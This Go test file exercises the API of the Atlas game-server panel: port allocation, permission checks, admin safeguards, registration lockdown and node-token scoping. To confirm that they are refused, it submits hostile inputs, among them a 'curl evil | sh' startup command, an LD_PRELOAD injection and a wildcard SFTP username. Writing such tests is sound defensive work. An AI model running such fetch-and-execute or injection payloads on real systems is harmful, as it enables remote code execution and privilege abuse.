package router_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/glebarez/sqlite"
	"github.com/luketaylor45/atlas/core/internal/config"
	"github.com/luketaylor45/atlas/core/internal/database"
	"github.com/luketaylor45/atlas/core/internal/models"
	"github.com/luketaylor45/atlas/core/internal/router"
	"github.com/luketaylor45/atlas/core/internal/utils"
	"golang.org/x/crypto/bcrypt"
	"gorm.io/gorm"
	"gorm.io/gorm/logger"
)

// fakeNode stands in for a daemon and records what Core asks of it.
type fakeNode struct {
	t      *testing.T
	server *httptest.Server
	token  string

	mu       sync.Mutex
	requests []nodeRequest
	// fail makes matching requests ("METHOD /path-suffix") return an error.
	fail map[string]int
}

type nodeRequest struct {
	Method string
	Path   string
	Body   map[string]interface{}
}

func newFakeNode(t *testing.T) *fakeNode {
	node := &fakeNode{t: t, token: "n_test-node-token", fail: map[string]int{}}
	node.server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Node-Token") != node.token {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		var body map[string]interface{}
		_ = json.NewDecoder(r.Body).Decode(&body)

		node.mu.Lock()
		node.requests = append(node.requests, nodeRequest{Method: r.Method, Path: r.URL.Path, Body: body})
		status := 0
		for pattern, code := range node.fail {
			method, suffix, _ := strings.Cut(pattern, " ")
			if r.Method == method && strings.HasSuffix(r.URL.Path, suffix) {
				status = code
			}
		}
		node.mu.Unlock()

		w.Header().Set("Content-Type", "application/json")
		if status != 0 {
			w.WriteHeader(status)
			_, _ = w.Write([]byte(`{"error":"node says no"}`))
			return
		}
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	t.Cleanup(node.server.Close)
	return node
}

func (n *fakeNode) calls(method, suffix string) []nodeRequest {
	n.mu.Lock()
	defer n.mu.Unlock()
	var matched []nodeRequest
	for _, request := range n.requests {
		if request.Method == method && strings.HasSuffix(request.Path, suffix) {
			matched = append(matched, request)
		}
	}
	return matched
}

type env struct {
	t      *testing.T
	engine *gin.Engine
	node   *fakeNode

	nodeRow models.Node
	egg     models.Egg
	admin   models.User
	owner   models.User
	other   models.User
}

func newEnv(t *testing.T) *env {
	t.Helper()
	gin.SetMode(gin.TestMode)

	dsn := "file:" + filepath.ToSlash(filepath.Join(t.TempDir(), "atlas.db")) + "?_pragma=foreign_keys(1)&_pragma=busy_timeout(5000)"
	db, err := gorm.Open(sqlite.Open(dsn), &gorm.Config{Logger: logger.Default.LogMode(logger.Silent)})
	if err != nil {
		t.Fatal(err)
	}
	database.DB = db
	t.Cleanup(func() {
		if sqlDB, err := db.DB(); err == nil {
			sqlDB.Close()
		}
	})
	if err := database.Migrate(); err != nil {
		t.Fatal(err)
	}

	config.AppConfig.JWTSecret = "test-secret-test-secret-test-secret-0000"
	config.AppConfig.RegistrationEnabled = false

	e := &env{t: t, node: newFakeNode(t)}
	e.engine = gin.New()
	router.Setup(e.engine)

	nodeURL, _ := url.Parse(e.node.server.URL)
	e.nodeRow = models.Node{Name: "Node-01", Address: "play.example.com", InternalAddress: nodeURL.Hostname(), Port: nodeURL.Port(), Token: e.node.token, IsOnline: true}
	must(t, db.Create(&e.nodeRow).Error)

	nest := models.Nest{UUID: "nest-1", Name: "Games", Code: "games"}
	must(t, db.Create(&nest).Error)
	e.egg = models.Egg{
		UUID: "egg-1", NestID: nest.ID, Available: true, Author: "Atlas", Name: "Palworld",
		DockerImage: "", DockerImages: `["image:one","image:two"]`, StartupCommand: "./start {{SERVER_PORT}}", StopCommand: "stop",
		ScriptInstall: "#!/bin/bash\necho secret-download-token", ScriptContainer: "installer", ScriptEntry: "bash",
		Ports: `[{"name":"RCON","env":"RCON_PORT","default":25575,"protocol":"tcp"}]`,
	}
	must(t, db.Create(&e.egg).Error)
	must(t, db.Create(&models.EggVariable{EggID: e.egg.ID, Name: "Server Name", EnvironmentVariable: "SERVER_NAME", DefaultValue: "Atlas"}).Error)
	locked := models.EggVariable{EggID: e.egg.ID, Name: "Tickrate", EnvironmentVariable: "TICKRATE", DefaultValue: "30"}
	must(t, db.Create(&locked).Error)
	must(t, db.Model(&locked).Update("user_editable", false).Error)

	e.admin = e.user("admin", true)
	e.owner = e.user("owner", false)
	e.other = e.user("other", false)
	return e
}

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

func (e *env) user(name string, admin bool) models.User {
	hash, _ := bcrypt.GenerateFromPassword([]byte("password-"+name), bcrypt.MinCost)
	user := models.User{Username: name, Password: string(hash), IsAdmin: admin}
	must(e.t, database.DB.Create(&user).Error)
	return user
}

type response struct {
	Code int
	Body map[string]interface{}
	Raw  string
}

func (e *env) do(user *models.User, method, path string, payload interface{}) response {
	e.t.Helper()
	var body bytes.Buffer
	if payload != nil {
		must(e.t, json.NewEncoder(&body).Encode(payload))
	}
	req := httptest.NewRequest(method, "/api/v1"+path, &body)
	req.Header.Set("Content-Type", "application/json")
	if user != nil {
		token, err := utils.GenerateToken(user.ID, user.IsAdmin)
		must(e.t, err)
		req.Header.Set("Authorization", "Bearer "+token)
	}
	recorder := httptest.NewRecorder()
	e.engine.ServeHTTP(recorder, req)

	result := response{Code: recorder.Code, Raw: recorder.Body.String()}
	_ = json.Unmarshal(recorder.Body.Bytes(), &result.Body)
	return result
}

func (e *env) expect(got response, code int) response {
	e.t.Helper()
	if got.Code != code {
		e.t.Fatalf("status = %d, want %d; body: %s", got.Code, code, got.Raw)
	}
	return got
}

// createService provisions a service owned by the test owner through the API.
func (e *env) createService(port int) models.Service {
	e.t.Helper()
	res := e.expect(e.do(&e.admin, http.MethodPost, "/admin/services", map[string]interface{}{
		"name": fmt.Sprintf("Server %d", port), "node_id": e.nodeRow.ID, "egg_id": e.egg.ID, "user_id": e.owner.ID,
		"memory": 2048, "disk": 10000, "cpu": 200, "port": port,
	}), http.StatusCreated)

	var service models.Service
	must(e.t, database.DB.Preload("Ports").Where("uuid = ?", res.Body["uuid"]).First(&service).Error)
	return service
}

func (e *env) markInstalled(service *models.Service) {
	must(e.t, database.DB.Model(service).Update("status", "offline").Error)
}

func (e *env) addSubUser(service models.Service, user models.User, grant models.ServiceUser) {
	grant.ServiceID = service.ID
	grant.UserID = user.ID
	console := grant.CanViewConsole
	must(e.t, database.DB.Create(&grant).Error)
	// The column default is true; write the intended value explicitly.
	must(e.t, database.DB.Model(&models.ServiceUser{}).Where("id = ?", grant.ID).Update("can_view_console", console).Error)
}

// ---------------------------------------------------------------- services

func TestCreateServiceAllocatesPortsAndSendsOneSpecToTheNode(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)

	if len(service.Ports) != 2 {
		t.Fatalf("ports = %+v, want the primary and the egg's RCON port", service.Ports)
	}
	calls := e.node.calls(http.MethodPost, "/api/servers")
	if len(calls) != 1 {
		t.Fatalf("node received %d create requests, want 1", len(calls))
	}
	spec := calls[0].Body
	if spec["egg_image"] != "image:one" || spec["install_entry"] != "bash" || spec["port"] != float64(8211) {
		t.Fatalf("spec = %v", spec)
	}
	extra := spec["ports"].([]interface{})
	if len(extra) != 1 || extra[0].(map[string]interface{})["port"] != float64(25575) {
		t.Fatalf("extra ports = %v", extra)
	}
	var environment map[string]string
	must(t, json.Unmarshal([]byte(spec["environment"].(string)), &environment))
	if environment["RCON_PORT"] != "25575" || environment["SERVER_NAME"] != "Atlas" {
		t.Fatalf("environment = %v", environment)
	}
}

func TestSecondServerOfTheSameGameGetsDifferentPorts(t *testing.T) {
	e := newEnv(t)
	e.createService(8211)

	res := e.do(&e.admin, http.MethodPost, "/admin/services", map[string]interface{}{
		"name": "Clash", "node_id": e.nodeRow.ID, "egg_id": e.egg.ID, "user_id": e.owner.ID,
		"memory": 1024, "disk": 1000, "cpu": 100, "port": 8211,
	})
	e.expect(res, http.StatusConflict)

	second := e.createService(8212)
	for _, port := range second.Ports {
		if port.Env == "RCON_PORT" && port.Port != 25576 {
			t.Fatalf("second server RCON port = %d, want the next free port 25576", port.Port)
		}
	}

	var count int64
	database.DB.Model(&models.Service{}).Count(&count)
	if count != 2 {
		t.Fatalf("%d services exist, want 2 (the conflicting one must not be kept)", count)
	}
}

func TestCreateServiceLeavesNothingBehindWhenTheNodeRefuses(t *testing.T) {
	e := newEnv(t)
	e.node.fail["POST /api/servers"] = http.StatusInternalServerError

	res := e.do(&e.admin, http.MethodPost, "/admin/services", map[string]interface{}{
		"name": "Doomed", "node_id": e.nodeRow.ID, "egg_id": e.egg.ID, "user_id": e.owner.ID,
		"memory": 1024, "disk": 1000, "cpu": 100, "port": 9000,
	})
	if res.Code < 500 {
		t.Fatalf("status = %d, want a server-side error", res.Code)
	}

	var services, ports int64
	database.DB.Unscoped().Model(&models.Service{}).Count(&services)
	database.DB.Model(&models.ServicePort{}).Count(&ports)
	if services != 0 || ports != 0 {
		t.Fatalf("%d services and %d ports were left behind", services, ports)
	}
}

func TestCreateServiceValidatesInput(t *testing.T) {
	e := newEnv(t)
	base := func() map[string]interface{} {
		return map[string]interface{}{
			"name": "Valid", "node_id": e.nodeRow.ID, "egg_id": e.egg.ID, "user_id": e.owner.ID,
			"memory": 1024, "disk": 1000, "cpu": 100, "port": 9000,
		}
	}
	cases := map[string]func(map[string]interface{}){
		"blank name":         func(p map[string]interface{}) { p["name"] = "  " },
		"zero memory":        func(p map[string]interface{}) { p["memory"] = 0 },
		"missing owner":      func(p map[string]interface{}) { p["user_id"] = 9999 },
		"port out of range":  func(p map[string]interface{}) { p["port"] = 70000 },
		"unknown variable":   func(p map[string]interface{}) { p["environment"] = `{"LD_PRELOAD":"/x.so"}` },
		"unknown extra port": func(p map[string]interface{}) { p["extra_ports"] = map[string]int{"NOPE_PORT": 1234} },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			payload := base()
			mutate(payload)
			res := e.do(&e.admin, http.MethodPost, "/admin/services", payload)
			if res.Code != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400; body: %s", res.Code, res.Raw)
			}
		})
	}
	if calls := e.node.calls(http.MethodPost, "/api/servers"); len(calls) != 0 {
		t.Fatalf("the node was contacted %d times for invalid requests", len(calls))
	}
}

func TestPartialUpdateChangesOnlyWhatWasSent(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.markInstalled(&service)

	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", service.ID), map[string]interface{}{"name": "Renamed"}), http.StatusOK)

	var updated models.Service
	must(t, database.DB.First(&updated, service.ID).Error)
	if updated.Name != "Renamed" || updated.Memory != 2048 || updated.Cpu != 200 || updated.Disk != 10000 || updated.DockerImage != "image:one" {
		t.Fatalf("a partial update changed other fields: %+v", updated)
	}
	if len(e.node.calls(http.MethodPost, "/rebuild")) != 0 {
		t.Fatal("renaming a server rebuilt its container")
	}
}

func TestChangingThePortMovesTheAllocationAndRebuildsTheContainer(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	other := e.createService(8300)
	e.markInstalled(&service)

	// A port held by another server is refused and nothing changes.
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", service.ID), map[string]interface{}{"port": other.Port}), http.StatusConflict)

	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", service.ID), map[string]interface{}{"port": 8400}), http.StatusOK)

	var primary models.ServicePort
	must(t, database.DB.Where("service_id = ? AND is_primary = ?", service.ID, true).First(&primary).Error)
	if primary.Port != 8400 {
		t.Fatalf("primary allocation = %d, want 8400", primary.Port)
	}
	rebuilds := e.node.calls(http.MethodPost, "/rebuild")
	if len(rebuilds) != 1 || rebuilds[0].Body["port"] != float64(8400) {
		t.Fatalf("rebuild calls = %+v", rebuilds)
	}

	// The old port is free again.
	e.createService(8211)
}

func TestDeleteKeepsTheServerWhenTheNodeFails(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.node.fail["DELETE /api/servers/"+service.UUID] = http.StatusInternalServerError

	res := e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/services/%d", service.ID), nil)
	if res.Code < 500 || res.Body["can_force"] != true {
		t.Fatalf("status = %d body = %s, want a failure that offers force", res.Code, res.Raw)
	}
	var count int64
	database.DB.Model(&models.Service{}).Where("id = ?", service.ID).Count(&count)
	if count != 1 {
		t.Fatal("the service record was deleted although the node still has the server")
	}

	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/services/%d?force=true", service.ID), nil), http.StatusOK)
	var services, ports int64
	database.DB.Unscoped().Model(&models.Service{}).Count(&services)
	database.DB.Model(&models.ServicePort{}).Count(&ports)
	if services != 0 || ports != 0 {
		t.Fatalf("force delete left %d services and %d ports", services, ports)
	}
}

func TestReinstallIsRefusedWhileInstalling(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211) // status: installing

	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/reinstall", nil), http.StatusConflict)
	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "start"}), http.StatusConflict)
	if len(e.node.calls(http.MethodPost, "/reinstall")) != 0 {
		t.Fatal("a reinstall reached the node while an install was running")
	}

	e.markInstalled(&service)
	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/reinstall", nil), http.StatusOK)
	var reloaded models.Service
	must(t, database.DB.First(&reloaded, service.ID).Error)
	if reloaded.Status != "installing" {
		t.Fatalf("status after reinstall = %q", reloaded.Status)
	}
}

func TestPowerActionSendsTheEggStopCommand(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.markInstalled(&service)

	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "stop"}), http.StatusOK)
	calls := e.node.calls(http.MethodPost, "/power")
	if len(calls) != 1 || calls[0].Body["stop_command"] != "stop" || calls[0].Body["action"] != "stop" {
		t.Fatalf("power calls = %+v", calls)
	}
	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "explode"}), http.StatusBadRequest)
}

func TestNodeRejectingCoreNeverLooksLikeAnExpiredSession(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.markInstalled(&service)
	e.node.fail["POST /power"] = http.StatusUnauthorized

	res := e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "start"})
	if res.Code != http.StatusBadGateway {
		t.Fatalf("status = %d, want 502 (a 401 would log the user out of the panel)", res.Code)
	}
}

// ------------------------------------------------------------- permissions

func TestUsersOnlySeeServersTheyCanAccess(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)

	e.expect(e.do(&e.other, http.MethodGet, "/services/"+service.UUID, nil), http.StatusNotFound)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "start"}), http.StatusNotFound)
	e.expect(e.do(nil, http.MethodGet, "/services/"+service.UUID, nil), http.StatusUnauthorized)
	e.expect(e.do(&e.owner, http.MethodGet, "/admin/services", nil), http.StatusForbidden)
	e.expect(e.do(&e.owner, http.MethodGet, "/services/"+service.UUID, nil), http.StatusOK)
}

func TestInstallScriptsAndInternalAddressesAreHiddenFromUsers(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)

	for _, path := range []string{"/services", "/services/" + service.UUID} {
		res := e.expect(e.do(&e.owner, http.MethodGet, path, nil), http.StatusOK)
		if strings.Contains(res.Raw, "secret-download-token") {
			t.Fatalf("%s exposed the egg install script to a user", path)
		}
		if strings.Contains(res.Raw, e.nodeRow.InternalAddress+`"`) && strings.Contains(res.Raw, `"internal_address":"`+e.nodeRow.InternalAddress) {
			t.Fatalf("%s exposed the node's internal address to a user", path)
		}
		if strings.Contains(res.Raw, e.node.token) {
			t.Fatalf("%s exposed the node token", path)
		}
	}
	admin := e.expect(e.do(&e.admin, http.MethodGet, "/services/"+service.UUID, nil), http.StatusOK)
	if !strings.Contains(admin.Raw, "secret-download-token") {
		t.Fatal("admins should still see the install script")
	}
}

func TestSubUserCannotEscalateOrManageAccess(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.markInstalled(&service)
	e.addSubUser(service, e.other, models.ServiceUser{}) // no permissions at all

	users := "/services/" + service.UUID + "/users"
	everything := map[string]interface{}{
		"user_id": e.other.ID, "can_view_console": true, "can_send_commands": true, "can_manage_files": true,
		"can_edit_startup": true, "can_control_power": true, "can_access_sftp": true,
	}

	e.expect(e.do(&e.other, http.MethodPut, fmt.Sprintf("%s/%d", users, e.other.ID), everything), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, users, map[string]interface{}{"user_id": e.admin.ID}), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodGet, users, nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodDelete, fmt.Sprintf("%s/%d", users, e.other.ID), nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodGet, "/services/"+service.UUID+"/logs", nil), http.StatusForbidden)

	var grant models.ServiceUser
	must(t, database.DB.Where("service_id = ? AND user_id = ?", service.ID, e.other.ID).First(&grant).Error)
	if grant.CanControlPower || grant.CanManageFiles || grant.CanSendCommands || grant.CanEditStartup || grant.CanAccessSFTP || grant.CanViewConsole {
		t.Fatalf("sub-user gained permissions: %+v", grant)
	}

	// Each permission is enforced on its own endpoint.
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "start"}), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/command", map[string]string{"command": "op me"}), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodGet, "/services/"+service.UUID+"/files/list?path=/", nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/console/ticket", nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/reinstall", nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/rebuild", nil), http.StatusForbidden)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/environment", map[string]string{"environment": `{"SERVER_NAME":"x"}`}), http.StatusForbidden)
	if len(e.node.calls(http.MethodPost, "/power"))+len(e.node.calls(http.MethodPost, "/command")) != 0 {
		t.Fatal("a forbidden action reached the node")
	}

	// The owner can still manage access.
	e.expect(e.do(&e.owner, http.MethodPut, fmt.Sprintf("%s/%d", users, e.other.ID), map[string]interface{}{"user_id": e.other.ID, "can_view_console": true}), http.StatusOK)
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/console/ticket", nil), http.StatusOK)
}

func TestStartupSettingsAreValidatedAgainstTheEgg(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.markInstalled(&service)
	path := "/services/" + service.UUID + "/environment"

	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"SERVER_NAME":"Mine"}`}), http.StatusOK)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"TICKRATE":"120"}`}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"LD_PRELOAD":"/x.so"}`}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{not json`}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{}`, "startup_command": "curl evil | sh"}), http.StatusForbidden)

	var reloaded models.Service
	must(t, database.DB.First(&reloaded, service.ID).Error)
	if reloaded.StartupCommand != e.egg.StartupCommand || !strings.Contains(reloaded.Environment, `"SERVER_NAME":"Mine"`) || !strings.Contains(reloaded.Environment, `"TICKRATE":"30"`) {
		t.Fatalf("stored startup = %q environment = %s", reloaded.StartupCommand, reloaded.Environment)
	}

	// Admins may change locked variables and the command.
	e.expect(e.do(&e.admin, http.MethodPost, path, map[string]string{"environment": `{"TICKRATE":"60"}`, "startup_command": "./start --fast"}), http.StatusOK)
}

// ---------------------------------------------------------------- accounts

func TestAdminRightsAreCheckedAgainstTheDatabaseOnEveryRequest(t *testing.T) {
	e := newEnv(t)
	second := e.user("second-admin", true)

	e.expect(e.do(&second, http.MethodGet, "/admin/users", nil), http.StatusOK)

	// The token still claims admin, but the account no longer is one.
	must(t, database.DB.Model(&models.User{}).Where("id = ?", second.ID).Update("is_admin", false).Error)
	e.expect(e.do(&second, http.MethodGet, "/admin/users", nil), http.StatusForbidden)

	must(t, database.DB.Delete(&models.User{}, second.ID).Error)
	e.expect(e.do(&second, http.MethodGet, "/services", nil), http.StatusUnauthorized)
}

func TestTheLastAdministratorCannotBeRemoved(t *testing.T) {
	e := newEnv(t)

	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/users/%d", e.admin.ID), map[string]interface{}{"is_admin": false}), http.StatusConflict)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/users/%d", e.admin.ID), nil), http.StatusConflict)

	second := e.user("second-admin", true)
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/users/%d", second.ID), map[string]interface{}{"is_admin": false}), http.StatusOK)
}

func TestUserManagementValidatesAndFreesUsernames(t *testing.T) {
	e := newEnv(t)

	e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "newbie", "password": "short"}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "newbie", "password": strings.Repeat("x", 80)}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "bad name!", "password": "long-enough-password"}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "OWNER", "password": "long-enough-password"}), http.StatusConflict)

	created := e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "newbie", "password": "long-enough-password"}), http.StatusCreated)
	id := uint(created.Body["id"].(float64))

	// An over-long password on update must be refused, not stored as an empty hash.
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/users/%d", id), map[string]interface{}{"password": strings.Repeat("x", 80)}), http.StatusBadRequest)
	e.expect(e.do(nil, http.MethodPost, "/auth/login", map[string]string{"username": "newbie", "password": "long-enough-password"}), http.StatusOK)

	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/users/%d", id), nil), http.StatusOK)
	e.expect(e.do(nil, http.MethodPost, "/auth/login", map[string]string{"username": "newbie", "password": "long-enough-password"}), http.StatusUnauthorized)
	// The name can be used again.
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/users", map[string]interface{}{"username": "newbie", "password": "another-long-password"}), http.StatusCreated)

	// A user who owns servers cannot be deleted from under them.
	e.createService(8211)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/users/%d", e.owner.ID), nil), http.StatusConflict)
}

func TestSessionAndPasswordSelfService(t *testing.T) {
	e := newEnv(t)

	me := e.expect(e.do(&e.owner, http.MethodGet, "/auth/me", nil), http.StatusOK)
	if me.Body["user"].(map[string]interface{})["username"] != "owner" || strings.Contains(me.Raw, "password") {
		t.Fatalf("me = %s", me.Raw)
	}
	e.expect(e.do(nil, http.MethodGet, "/auth/me", nil), http.StatusUnauthorized)

	path := "/auth/password"
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"current_password": "wrong", "new_password": "a-brand-new-password"}), http.StatusForbidden)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"current_password": "password-owner", "new_password": "short"}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"current_password": "password-owner", "new_password": "a-brand-new-password"}), http.StatusOK)

	e.expect(e.do(nil, http.MethodPost, "/auth/login", map[string]string{"username": "owner", "password": "password-owner"}), http.StatusUnauthorized)
	e.expect(e.do(nil, http.MethodPost, "/auth/login", map[string]string{"username": "Owner", "password": "a-brand-new-password"}), http.StatusOK)
}

func TestRegistrationAndSetupAreClosedOnceConfigured(t *testing.T) {
	e := newEnv(t)

	e.expect(e.do(nil, http.MethodPost, "/auth/register", map[string]string{"username": "walk-in", "password": "long-enough-password"}), http.StatusForbidden)
	e.expect(e.do(nil, http.MethodPost, "/auth/setup", map[string]string{"username": "intruder", "password": "long-enough-password"}), http.StatusForbidden)

	config.AppConfig.RegistrationEnabled = true
	t.Cleanup(func() { config.AppConfig.RegistrationEnabled = false })
	res := e.expect(e.do(nil, http.MethodPost, "/auth/register", map[string]string{"username": "walk-in", "password": "long-enough-password"}), http.StatusCreated)
	if res.Body["user"].(map[string]interface{})["is_admin"] != false {
		t.Fatal("a self-registered account was made an administrator")
	}
}

func TestInitialSetupCreatesExactlyOneAdministrator(t *testing.T) {
	e := newEnv(t)
	// Start from an empty instance.
	must(t, database.DB.Exec("DELETE FROM users").Error)

	var wg sync.WaitGroup
	codes := make([]int, 6)
	for i := range codes {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			codes[i] = e.do(nil, http.MethodPost, "/auth/setup", map[string]string{"username": fmt.Sprintf("admin%d", i), "password": "long-enough-password"}).Code
		}(i)
	}
	wg.Wait()

	created := 0
	for _, code := range codes {
		if code == http.StatusCreated {
			created++
		}
	}
	var admins int64
	database.DB.Model(&models.User{}).Where("is_admin = ?", true).Count(&admins)
	if created != 1 || admins != 1 {
		t.Fatalf("%d setup requests succeeded and %d administrators exist; want exactly 1 (codes %v)", created, admins, codes)
	}
}

// ------------------------------------------------------------------- nodes

func TestInternalRoutesRequireTheNodeTokenAndAreScopedToTheNode(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)

	post := func(token string, path string, payload interface{}) int {
		var body bytes.Buffer
		must(t, json.NewEncoder(&body).Encode(payload))
		req := httptest.NewRequest(http.MethodPost, "/api/v1/internal"+path, &body)
		req.Header.Set("Content-Type", "application/json")
		if token != "" {
			req.Header.Set("X-Node-Token", token)
		}
		recorder := httptest.NewRecorder()
		e.engine.ServeHTTP(recorder, req)
		return recorder.Code
	}
	status := "/services/" + service.UUID + "/status"

	if code := post("", status, map[string]string{"status": "running"}); code != http.StatusUnauthorized {
		t.Fatalf("no token: %d", code)
	}
	if code := post("wrong", "/heartbeat", map[string]interface{}{}); code != http.StatusUnauthorized {
		t.Fatalf("wrong token: %d", code)
	}
	if code := post(e.node.token, status, map[string]string{"status": "hacked"}); code != http.StatusBadRequest {
		t.Fatalf("unknown status: %d", code)
	}
	if code := post(e.node.token, status, map[string]string{"status": "running"}); code != http.StatusOK {
		t.Fatalf("valid status: %d", code)
	}

	// Another node cannot report on this node's services.
	foreign := models.Node{Name: "Node-02", Address: "other.example.com", Port: "8081", Token: "n_other-node-token"}
	must(t, database.DB.Create(&foreign).Error)
	if code := post(foreign.Token, status, map[string]string{"status": "offline"}); code != http.StatusNotFound {
		t.Fatalf("foreign node: %d, want 404", code)
	}
	var reloaded models.Service
	must(t, database.DB.First(&reloaded, service.ID).Error)
	if reloaded.Status != "running" {
		t.Fatalf("status = %q after a foreign node tried to change it", reloaded.Status)
	}

	// SFTP: only this node may validate, and only for a matching service.
	sftp := func(token, username, password string) (int, bool) {
		var body bytes.Buffer
		must(t, json.NewEncoder(&body).Encode(map[string]string{"username": username, "password": password}))
		req := httptest.NewRequest(http.MethodPost, "/api/v1/internal/sftp/validate", &body)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Node-Token", token)
		recorder := httptest.NewRecorder()
		e.engine.ServeHTTP(recorder, req)
		var parsed struct {
			Valid bool `json:"valid"`
		}
		_ = json.Unmarshal(recorder.Body.Bytes(), &parsed)
		return recorder.Code, parsed.Valid
	}
	prefix := service.UUID[:8]
	if _, valid := sftp(e.node.token, prefix+".owner", "password-owner"); !valid {
		t.Fatal("the owner could not log in over SFTP")
	}
	if _, valid := sftp(e.node.token, prefix+".other", "password-other"); valid {
		t.Fatal("a user with no access logged in over SFTP")
	}
	if _, valid := sftp(e.node.token, "%.owner", "password-owner"); valid {
		t.Fatal("a wildcard service prefix was accepted")
	}
	if _, valid := sftp(e.node.token, prefix+".owner", "wrong"); valid {
		t.Fatal("a wrong password was accepted")
	}
	if _, valid := sftp(foreign.Token, prefix+".owner", "password-owner"); valid {
		t.Fatal("a different node validated a login for this node's service")
	}
}

func TestNodeManagement(t *testing.T) {
	e := newEnv(t)
	e.createService(8211)
	path := fmt.Sprintf("/admin/nodes/%d", e.nodeRow.ID)

	// The token cannot be read or replaced through an update.
	res := e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"name": "Renamed", "token": "attacker", "id": 999}), http.StatusOK)
	if strings.Contains(res.Raw, e.node.token) {
		t.Fatal("the node token was returned")
	}
	var node models.Node
	must(t, database.DB.First(&node, e.nodeRow.ID).Error)
	if node.Token != e.node.token || node.Name != "Renamed" || node.Address != "play.example.com" {
		t.Fatalf("node after update: %+v", node)
	}

	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"address": "http://bad/host"}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"port": "99999"}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/nodes", map[string]interface{}{"name": "No address"}), http.StatusBadRequest)

	// A node with servers cannot be deleted from under them.
	e.expect(e.do(&e.admin, http.MethodDelete, path, nil), http.StatusConflict)

	rotated := e.expect(e.do(&e.admin, http.MethodPost, path+"/token", nil), http.StatusOK)
